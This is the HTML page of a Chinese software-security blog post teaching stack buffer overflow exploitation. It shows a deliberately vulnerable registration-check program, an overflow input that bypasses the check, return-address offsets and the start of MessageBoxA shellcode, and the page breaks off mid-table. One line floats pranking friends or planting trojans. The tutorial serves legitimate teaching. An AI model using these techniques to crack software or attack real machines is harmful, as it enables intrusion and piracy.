@@ -1,0 +1,2462 @@
+<!DOCTYPE html>
+<html>
+  <!-- meta/link... -->
+  
+
+
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+  <title>漏洞利用篇 | Jan&#39;s Blog</title>
+
+  <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
+  <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
+  <link href="https://unpkg.com/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+  <link href="/js/swiper/swiper@5.4.1.min.css" rel="stylesheet">
+  
+  
+    <script>
+        var themeModelId = '';
+        if (themeModelId) {
+            localStorage.setItem('modelId', themeModelId);
+        }
+    </script>
+    
+    <script src="https://cdn.jsdelivr.net/gh/yuang01/live2d-widget@latest/autoload.js"></script>
+    <script>
+        var live2dOpen = eval('true') || false;
+        if (!live2dOpen) {
+            localStorage.setItem('waifu-display', 1609323474481);
+        }
+    </script>
+  
+  
+  
+<link rel="stylesheet" href="/css/animate.min.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/js/shareJs/share.min.css">
+
+  
+  <style>
+        @media (max-width: 992px) {
+            #waifu {
+                display: none;
+            }
+        }
+    </style>
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+
+    
+        <script src="/js/valine/index.js"></script>
+    
+
+    <!-- import link -->
+    
+        
+            
+        
+            
+        
+    
+    <!-- import script -->
+    
+        
+            
+        
+            
+        
+    
+
+<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="Jan's Blog" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+  
+  <!-- 依赖于jquery和vue -->
+  
+    
+<script src="https://unpkg.com/jquery@3.5.1/dist/jquery.min.js"></script>
+
+  
+
+  
+    
+<script src="https://unpkg.com/vue@2.6.11/dist/vue.min.js"></script>
+
+  
+  
+  <!-- 预加载动画 -->
+  <!-- 页面预加载动画 -->
+
+  
+    <div class="preloader_2" id="loader">
+  <div class="loader"></div>
+</div>
+
+  
+<script>
+  var endLoading = function () {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loader').classList.add("loading");
+  }
+  window.addEventListener('DOMContentLoaded',endLoading);
+</script>
+
+  <body>
+    <!-- 判断是否为暗黑风格 -->
+    <!-- 判断是否为黑夜模式 -->
+<script>
+  let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+
+  if (isDark) {
+    $(document.body).addClass('darkModel');
+  }
+</script>
+
+    <!-- 需要在上面加载的js -->
+    <script>
+  function loadScript(src, cb) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var HEAD = document.getElementsByTagName("head")[0] || document.documentElement;
+        var script = document.createElement("script");
+        script.setAttribute("type", "text/javascript");
+        if (cb) {
+          if (JSON.stringify(cb)) {
+            for (let p in cb) {
+              if (p == "onload") {
+                script[p] = () => {
+                  cb[p]()
+                  resolve()
+                }
+              } else {
+                script[p] = cb[p]
+                script.onload = resolve
+              }
+            }
+          } else {
+            script.onload = () => {
+              cb()
+              resolve()
+            };
+          }
+        } else {
+          script.onload = resolve
+        }
+        script.setAttribute("src", src);
+        HEAD.appendChild(script);
+      });
+    });
+  }
+
+  //https://github.com/filamentgroup/loadCSS
+  var loadCSS = function (src) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var link = document.createElement('link');
+        link.rel = "stylesheet";
+        link.href = src;
+        link.onload = resolve;
+        document.getElementsByTagName("head")[0].appendChild(link);
+      });
+    });
+  };
+
+</script> 
+
+<!-- 轮播图所需要的js -->
+<script src="/js/swiper/swiper.min.js"></script>
+<script src="/js/swiper/vue-awesome-swiper.js"></script>
+<script src="/js/swiper/swiper.animate1.0.3.min.js"></script>
+
+<script type="text/javascript">
+  Vue.use(window.VueAwesomeSwiper)
+</script>
+
+
+  <script src="/js/vue-typed-js/index.js"></script>
+
+
+<!-- 首页的公告滚动插件的js需要重新加载 -->
+<script src="/js/vue-seamless-scroll/index.js"></script>
+
+<!-- 打字机效果js -->
+<script src="https://unpkg.com/typed.js@2.0.11"></script>
+
+
+    <div id="safearea">
+      <main class="main" id="pjax-container">
+        <!-- 头部导航 -->
+        
+<header class="header  " 
+  id="navHeader"
+  style="position: fixed;
+  left: 0; top: 0; z-index: 10;width: 100%;"
+>
+  <div class="header-content">
+    <div class="bars">
+      <div id="appDrawer" class="sidebar-image">
+  <div class="drawer-box-icon">
+    <i class="fas fa-bars" aria-hidden="true" @click="showDialogDrawer"></i>
+  </div>
+  
+  <transition name="fade">
+    <div class="drawer-box_mask" v-cloak style="display: none;" v-show="visible" @click.self="cancelDialogDrawer">
+    </div>
+  </transition>
+  <div class="drawer-box" :class="{'active': visible}">
+    <div class="drawer-box-head bg-color">
+      <img class="drawer-box-head_logo lazyload placeholder" src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+      <h3 class="drawer-box-head_title">Jan&#39;s Blog</h3>
+      <h5 class="drawer-box-head_desc">千磨万击还坚劲，任尔东西南北风</h5>
+    </div>
+    
+    <div class="drawer-box-content">
+      <ul class="drawer-box-content_menu">
+        
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-home" aria-hidden="true"></i>
+                  
+                  <span class="name">首页</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/archives" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/tags" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-tags" aria-hidden="true"></i>
+                  
+                  <span class="name">标签</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/categories" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/about" class="drawer-menu-item-link">
+                  
+                  <span class="name">关于</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/resume" class="drawer-menu-item-link">
+                  
+                  <span class="name">简历</span>
+                </a>
+              
+            </li>
+          
+        
+        
+          <li class="drawer-box-content_item">
+            <a target="_blank" rel="noopener" href="https://github.com/Jan-nku/Jan-nku.github.io">
+              <i class="fas fa-github" aria-hidden="true"></i>
+              <span>Github</span>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDrawer',
+    data: {
+      visible: false,
+      top: 0,
+      openArr: [],
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      isOpen(index) {
+        if (this.openArr.includes(index)) {
+          return true;
+        } else {
+          return false;
+        }
+      },
+      openOrCloseMenu(curIndex) {
+        const index = this.openArr.indexOf(curIndex);
+        if (index !== -1) {
+          this.openArr.splice(index, 1);
+        } else {
+          this.openArr.push(curIndex);
+        }
+      },
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'width: 100%; height: 100%;overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      }
+    },
+    created() {}
+  })
+</script>
+
+    </div>
+    <div class="blog-title" id="author-avatar">
+      
+        <div class="avatar">
+          <img src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+        </div>
+      
+      <a href="/" class="logo">Jan&#39;s Blog</a>
+    </div>
+    <nav class="navbar">
+      <ul class="menu">
+        
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/" class="menu-item-link" title="首页">
+                  
+                    <i class="fas fa-home" aria-hidden="true"></i>
+                  
+                  <span class="name">首页</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/archives" class="menu-item-link" title="归档">
+                  
+                    <i class="fas fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/tags" class="menu-item-link" title="标签">
+                  
+                    <i class="fas fa-tags" aria-hidden="true"></i>
+                  
+                  <span class="name">标签</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/categories" class="menu-item-link" title="分类">
+                  
+                    <i class="fas fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/about" class="menu-item-link" title="关于">
+                  
+                  <span class="name">关于</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/resume" class="menu-item-link" title="简历">
+                  
+                  <span class="name">简历</span>
+                </a>
+              
+            </li>
+          
+        
+      </ul>
+      
+      
+        <div id="appSearch">
+  <div class="search"  @click="showDialog()"><i class="fas fa-search" aria-hidden="true"></i></div>
+  <transition name="fade">
+    <div class="message-box_wrapper" style="display: none;" v-cloak v-show="dialogVisible" @click.self="cancelDialogVisible()">
+      <div class="message-box animated bounceInDown">
+        <h2>
+          <span>
+            <i class="fas fa-search" aria-hidden="true"></i>
+            <span class="title">本地搜索</span>
+          </span>
+          <i class="fas fa-times close" pointer style="float:right;" aria-hidden="true" @click.self="cancelDialogVisible()"></i>
+        </h2>
+        <form class="site-search-form">
+          <input type="text"
+            placeholder="请输入关键字"
+            id="local-search-input" 
+            @click="getSearchFile()"
+            class="st-search-input"
+            v-model="searchInput"
+          />
+        </form>
+        <div class="result-wrapper">
+          <div id="local-search-result" class="local-search-result-cls"></div>
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+<script src="/js/local_search.js"></script>
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appSearch',
+    data: {
+      dialogVisible: false,
+      searchInput: '',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+      window.addEventListener('pjax:complete', () => {
+        this.cancelDialogVisible();
+      })
+    },
+    methods: {
+      showDialog() {
+        this.dialogVisible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'overflow: hidden;';
+      },
+      getSearchFile() {
+        if (!this.searchInput) {
+          getSearchFile("/search.xml");
+        }
+      },
+      cancelDialogVisible() {
+        this.dialogVisible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+    },
+    created() {}
+  })
+</script>
+<!-- 解决刷新页面闪烁问题，可以在元素上添加display: none, 或者用vue.extend方法，详情：https://blog.csdn.net/qq_31393401/article/details/81017912 -->
+<!-- 下面是搜索基本写法 -->
+<!-- <script type="text/javascript" id="local.search.active">
+  var inputArea = document.querySelector("#local-search-input");
+  inputArea.onclick   = function(){ getSearchFile(); this.onclick = null }
+  inputArea.onkeydown = function(){ if(event.keyCode == 13) return false }
+</script> -->
+
+      
+
+    </nav>
+  </div>
+  
+    <a target="_blank" rel="noopener" href="https://github.com/Jan-nku/Jan-nku.github.io" class="github-corner color-primary" aria-label="View source on GitHub"><svg width="60" height="60" viewBox="0 0 250 250" style="fill:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+  
+  
+</header>
+        <!-- 内容区域 -->
+        
+ <!-- prismjs 代码高亮 -->
+ 
+
+
+<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
+
+
+  <!-- 文章详情页顶部图片和标题 -->
+
+
+
+
+<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
+  background-position: center center;position: relative;background-image:url('https://pic3.zhimg.com/80/v2-5f7cb7e900b9dcf5354c3d4d2c5cc3c2_1440w.webp')">
+  <div class="post-detail-header-mask"></div>
+  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
+  
+  <div class="post-detail-header_info-box">
+    <div class="title-box">
+      <span class="title">
+        漏洞利用篇
+      </span>
+    </div>
+    
+    
+      
+        <span class="post-detail-header_date">
+          <i class="fas fa-calendar"></i> 发表于：2023-03-14 |
+        </span>
+      
+
+      
+        <span class="post-detail-header_categories">
+          <i class="iconfont iconbookmark1"></i> 分类：
+          
+            <a href="/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/" class="post-detail-header_category">
+              软件安全
+            </a>
+          
+        </span>
+      
+
+      
+    
+  </div>
+  
+  
+    <script src="/js/bubble/bubble.js"></script>
+  
+</div>
+
+
+
+
+
+<div class="post-detail-content post-row" 
+  style="padding-top: 0px;">
+  <div class="main-content">
+    <article class="post post-detail">
+      <div class="post-content">
+        <h1 id="漏洞利用概念及示例"><a href="#漏洞利用概念及示例" class="headerlink" title="漏洞利用概念及示例"></a>漏洞利用概念及示例</h1><h2 id="漏洞利用概念"><a href="#漏洞利用概念" class="headerlink" title="漏洞利用概念"></a>漏洞利用概念</h2><p><strong>漏洞利用（exploit）</strong>是指针对已有的漏洞，根据漏洞的类型和特点而采取相应的技术方案，进行尝试性或实质性的攻击。Exploit 的英文意思就是利用，它在黑客眼里就是漏洞利用。有漏洞不一定就有Exploit（利用），但是有Exploit就肯定有漏洞。</p>
+<p>假设，刚刚发现了一个Minishare的0Day漏洞。Minishare是一款文件共享软件，该0Day漏洞是一个缓冲区溢出漏洞，这个漏洞影响之前的所有版本。当用户向服务器发送的报文长度过大（超过堆栈边界）时就会触发该漏洞。</p>
+<p>得到该漏洞后，可以做点什么呢？善意点的，可以对同学或者朋友的电脑搞搞恶作剧，让他的电脑弹出个对话框之类的。恶意的话，可以利用这个漏洞来向目标机器植入木马，窃听用户个人隐私等。</p>
+<h3 id="漏洞利用手段"><a href="#漏洞利用手段" class="headerlink" title="漏洞利用手段"></a>漏洞利用手段</h3><p>在1996年，Aleph One在Underground发表了著名论文《SMASHING THE STACK FOR FUN AND PROFIT》，其中详细描述了<strong>Linux系统中栈的结构和如何利用基于栈的缓冲区溢出</strong>。在这篇具有划时代意义的论文中，Aleph One演示了如何向进程中植入一段用于获得shell的代码，并在论文中称这段被植入进程的代码为“<strong>shellcode</strong>”。</p>
+<h4 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h4><p>实际上，Shell是一个命令解释器，它解释由用户输入的命令并且把它们送到内核。</p>
+<h4 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h4><p>现在，“shellcode”已经表达的是<strong>广义上的植入进程的代码</strong>，而不是狭义上的仅仅用来获得shell的代码。</p>
+<h3 id="漏洞利用的核心"><a href="#漏洞利用的核心" class="headerlink" title="漏洞利用的核心"></a>漏洞利用的核心</h3><p>漏洞利用的核心就是利用程序漏洞去劫持<strong>进程的控制权</strong>，实现<strong>控制流劫持</strong>，以便执行植入的shellcode或者达到其它的攻击目的。</p>
+<p>当攻击者掌握了被攻击程序的内存错误漏洞后，一般会考虑发起控制流劫持攻击。早期的攻击通常采用代码植入的方式，通过上载一段代码，将控制转向这段代码执行。在栈溢出漏洞的利用过程中，攻击的目的是<strong>淹没返回地址</strong>，以便劫持进程的控制权，<u>让程序跳转去执行shellcode</u>。 </p>
+<h4 id="Exploit的结构"><a href="#Exploit的结构" class="headerlink" title="Exploit的结构"></a>Exploit的结构</h4><p>要完成攻击，Exploit需要执行shellcode，但Exploit中并不仅是shellcode。</p>
+<ul>
+<li>Exploit要达到攻击目标，要做的工作更多，比如<strong>对应的触发漏洞</strong>、<strong>将控制权转移到shellcode</strong>一般均不相同，而且他们通常独立于shellcode的代码。</li>
+<li>能实现特定目标的Exploit的有效载荷，称为<code>Payload</code>。</li>
+</ul>
+<blockquote>
+<p>一个经典的比喻，将漏洞利用过程比作导弹发射的过程：<u><strong>Exploit、payload和shellcode</strong>分别是导弹发射装置、导弹和弹头</u>。Exploit是导弹发生装置，针对目标发射导弹（payload）；导弹到达目标之后，释放实际危害的弹头（类似shellcode）爆炸；导弹除了弹头之外的其余部分用来实现对目标进行<strong>定位追踪、对弹头引爆</strong>等功能，在漏洞利用中，对应payload的非shellcode的部分。</p>
+</blockquote>
+<p>Exploit是指利用漏洞进行攻击的动作；Shellcode用来实现具体的功能；Payload除了包含shellcode之外，还需要考虑如何触发漏洞并让系统或者程序去执行shellcode。</p>
+<h2 id="覆盖临接变量示例"><a href="#覆盖临接变量示例" class="headerlink" title="覆盖临接变量示例"></a>覆盖临接变量示例</h2><p>假设我们已知一个系统的注册机验证过程的漏洞，程序举例如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#define REGCODE &quot;12345678&quot;</span><br><span class="line">int verify (char * code)&#123;</span><br><span class="line">    int flag;</span><br><span class="line">    char buffer[44];</span><br><span class="line">    flag=strcmp(REGCODE, code);</span><br><span class="line">    strcpy(buffer, code);</span><br><span class="line">    return flag; </span><br><span class="line">&#125;</span><br><span class="line">//假设其主程序启动的时候要校验注册码</span><br><span class="line">void main()&#123;</span><br><span class="line">    int vFlag=0;</span><br><span class="line">    char regcode[1024];</span><br><span class="line">    FILE *fp;</span><br><span class="line">    LoadLibrary(&quot;user32.dll&quot;);</span><br><span class="line">    if(!(fp=fopen(&quot;reg.txt&quot;,&quot;rw+&quot;)))   exit(0); </span><br><span class="line">    fscanf(fp,&quot;%s&quot;, regcode);</span><br><span class="line">    vFlag=verify(regcode);</span><br><span class="line">    if(vFlag)   </span><br><span class="line">      printf(&quot;wrong regcode!&quot;);</span><br><span class="line">    else   </span><br><span class="line">      printf(&quot;passed!&quot;); </span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="verify函数的缓冲区"><a href="#verify函数的缓冲区" class="headerlink" title="verify函数的缓冲区"></a>verify函数的缓冲区</h3><p>Verify函数的缓冲区为44个字节，对应的栈帧状态如下图所示：</p>
+<p><img src="/2023/03/14/lou-dong-li-yong-pian/747c7e35dc8f2b52b379c335ba1a9192.png" class="lazyload placeholder" data-srcset="/2023/03/14/lou-dong-li-yong-pian/747c7e35dc8f2b52b379c335ba1a9192.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<h3 id="漏洞利用：覆盖临接变量"><a href="#漏洞利用：覆盖临接变量" class="headerlink" title="漏洞利用：覆盖临接变量"></a>漏洞利用：覆盖临接变量</h3><blockquote>
+<p>软件漏洞篇讲栈溢出漏洞时提到覆盖临接变量示例</p>
+</blockquote>
+<p><strong>利用目标</strong>：利用溢出覆盖临接变量，实现控制流劫持，完成软件破解。</p>
+<p>利用这个漏洞，我们可以破解该软件，让注册码无效。只需要想法<strong>淹没flag状态位</strong>，使其<strong>变为0</strong>即可，则只需要设计：buffer（44字节）+1字节（整数0），即在reg.txt中写入45个字节，其中最后1个字节为0。</p>
+<p>如果能对reg.txt写入二进制数据，我们利用Ultraedit打开reg.txt，并在该文件中写入</p>
+<p><code>“123412341234123412341234123412341234123412341”。需要将最后1个字节由ASCII-1改为全0。</code></p>
+<h2 id="Shellcode代码植入示例"><a href="#Shellcode代码植入示例" class="headerlink" title="Shellcode代码植入示例"></a>Shellcode代码植入示例</h2><h3 id="漏洞利用：代码植入"><a href="#漏洞利用：代码植入" class="headerlink" title="漏洞利用：代码植入"></a>漏洞利用：代码植入</h3><p><strong>利用目标</strong>：利用溢出覆盖返回地址，转去执行植入的恶意程序。 </p>
+<p><img src="/2023/03/14/lou-dong-li-yong-pian/7319a7b7f2de4a656ae4975ee3234d74.png" class="lazyload placeholder" data-srcset="/2023/03/14/lou-dong-li-yong-pian/7319a7b7f2de4a656ae4975ee3234d74.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>基于上述程序，编写shellcode，完成代码植入</p>
+<blockquote>
+<p>Shellcode往往需要用<strong>汇编语言</strong>编写，并<strong>转换成二进制机器码</strong>，其内容和长度经常还会受到很多苛刻限制，故<u>开发和调试的难度很高</u>。</p>
+</blockquote>
+<p>植入代码之前要做大量的调试工作，比如：</p>
+<ol>
+<li>弄清楚程序有几个输入点，这些输入将最终会当作哪个函数的第几个参数读入到内存的哪一个区域，<strong>哪一个输入会造成栈溢出</strong>，在复制到栈区的时候对这些数据有没有额外的限制等；</li>
+<li>调试之后还要计算<strong>函数返回地址距离缓冲区的偏移</strong>并淹没之;</li>
+<li><strong>选择指令的地址</strong>, 最终制作出一个有攻击效果的“承载”着<code>shellcode</code>的输入字符串。</li>
+</ol>
+<h3 id="编写shellcode"><a href="#编写shellcode" class="headerlink" title="编写shellcode"></a>编写shellcode</h3><p><strong>目标</strong>：编写一段代码，使其能够淹没返回地址，该返回地址将执行一个MessageBox函数，弹出窗体。</p>
+<p>为了能淹没返回地址，需要在reg.txt中至少写入：buffer(44字节)+flag(4字节)+前EBP值(4字节)，也就是53—56才是要淹没的地址。让程序弹出一个消息框只需要调用Windows的API函数MessageBox。</p>
+<p>MSDN对MessageBox函数的解释如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int MessageBox(</span><br><span class="line">HWND hWnd,          // handle to owner window</span><br><span class="line">LPCTSTR lpText,        // text in message box</span><br><span class="line">LPCTSTR lpCaption,     // message box title</span><br><span class="line">UINT uType            // message box style</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>hWnd<blockquote>
+<p>消息框所属窗口的<strong>句柄</strong>，如果为NULL，消息框则不属于任何窗口。</p>
+</blockquote>
+</li>
+<li>lpText<blockquote>
+<p>字符串指针，所指字符串会在消息框中显示。</p>
+</blockquote>
+</li>
+<li>lpCaption<blockquote>
+<p>字符串指针，所指字符串将成为消息框的标题。</p>
+</blockquote>
+</li>
+<li>uType<blockquote>
+<p>消息框的风格（单按钮、多按钮等），NULL代表默认风格。</p>
+</blockquote>
+</li>
+</ul>
+<p>我们将写出调用这个API的<strong>汇编代码</strong>，然后翻译成<strong>机器代码</strong>，用十六进制编辑工具填入reg.txt文件。<code>注意：使用MessageBoxA函数。</code></p>
+<h4 id="用汇编语言编写MessageBoxA需要三个步骤"><a href="#用汇编语言编写MessageBoxA需要三个步骤" class="headerlink" title="用汇编语言编写MessageBoxA需要三个步骤"></a>用汇编语言编写MessageBoxA需要三个步骤</h4><ol>
+<li>装载动态链接库user32.dll。<u>MessageBoxA是动态链接库user32.dll的导出函数</u>。虽然大多数有图形化操作界面的程序都已经装载了这个库，但是我们用来实验的consol版并没有默认加载它。</li>
+<li>在汇编语言中调用这个函数需要获得函数的入口地址。</li>
+<li>在调用前需要向栈中按从右向左的顺序压入4个参数。为了让植入的机器代码更加简洁明了，我们在实验准备中构造漏洞程序的时候已经<strong>人工加载了user32.dll这个库</strong>，所以第一步操作不用在汇编语言中考虑。</li>
+</ol>
+<p><strong>第一步：获取函数入口地址</strong></p>
+<blockquote>
+<p>获取函数入口地址：MessageBoxA的入口地址可以通过user32.dll在系统中加载的<strong>基址</strong>和MessageBoxA在库中的<strong>偏移</strong>相加得到。可以使用VC6.0自带的小工具“Dependency Walker”获得这些信息，如下图user32.dll的基地址为 0x77D10000，MessageBoxA的偏移地址为0x000407EA。基地址加上偏移地址就得到了MessageBoxA函数在内存中的入口地址：0x77D507EA。</p>
+</blockquote>
+<p><img src="/2023/03/14/lou-dong-li-yong-pian/2c6f87661e80ee833b0b88cc209735fe.png" class="lazyload placeholder" data-srcset="/2023/03/14/lou-dong-li-yong-pian/2c6f87661e80ee833b0b88cc209735fe.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<blockquote>
+<p>使用代码来获取相关函数地址：在C/C++语言中，<code>GetProcAddress</code>函数<strong>检索指定的动态链接库（DLL）中的输出库函数地址</strong>。如果函数调用成功，返回值是DLL中的输出函数地址。函数原型如下：</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FARPROC GetProcAddress(</span><br><span class="line"> HMODULE hModule, // DLL 模块句柄</span><br><span class="line"> LPCSTR lpProcName // 函数名</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>参数hModule<strong>包含此函数的DLL模块的句柄</strong>。<code>LoadLibrary</code>、AfxLoadLibrary或者<code>GetModuleHandle</code>函数可以返回此句柄。</li>
+<li>参数lpProcName是包含函数名的以NULL结尾的字符串，或者指定函数的序数值。</li>
+<li>FARPROC是一个4字节指针，指向一个函数的内存地址，GetProcAddress的返回类型就是FARPROC。如果你要存放这个地址，可以声明以一个FARPROC变量来存放。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123; </span><br><span class="line">        HINSTANCE LibHandle;</span><br><span class="line">        FARPROC ProcAdd;</span><br><span class="line">        LibHandle = LoadLibrary(&quot;user32&quot;);</span><br><span class="line">        //获取user32.dll的地址</span><br><span class="line">        printf(&quot;user32 = 0x%x \n&quot;, LibHandle);</span><br><span class="line">        //获取MessageBoxA的地址</span><br><span class="line">        ProcAdd=(FARPROC)GetProcAddress(LibHandle,&quot;MessageBoxA&quot;);</span><br><span class="line">        printf(&quot;MessageBoxA = 0x%x \n&quot;, ProcAdd);</span><br><span class="line">        getchar();</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br><span class="line">//运行代码可以得到入口地址：0x77D507EA</span><br></pre></td></tr></table></figure>
+
+<p><strong>第二步：编写函数调用的汇编代码</strong></p>
+<blockquote>
+<p>编写函数调用的汇编代码：先把<strong>字符串“westwest”</strong>压入栈区，消息框的文本和标题都显示为“westwest”，只要<strong>重复压入指向这个字符串的指针</strong>即可；第1个和第4个参数这里都将设置为NULL。</p>
+</blockquote>
+<table>
+<thead>
+<tr>
